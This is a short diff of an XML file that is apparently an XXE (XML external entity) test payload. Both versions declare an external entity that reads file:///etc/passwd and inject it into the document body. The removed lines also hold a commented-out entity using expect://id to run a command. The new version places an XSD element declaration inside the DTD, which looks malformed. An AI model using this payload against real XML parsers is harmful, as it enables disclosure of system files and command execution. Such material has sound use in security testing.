@@ -1,6 +1,8 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<!--<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>-->
+<!DOCTYPE root [
+<xsd:element name="root" type="xsd:string"/>
+<!ENTITY xxe SYSTEM "file:///etc/passwd" />
+]>
 <root>
-  <content>&xxe;</content>
+  &xxe;
 </root>
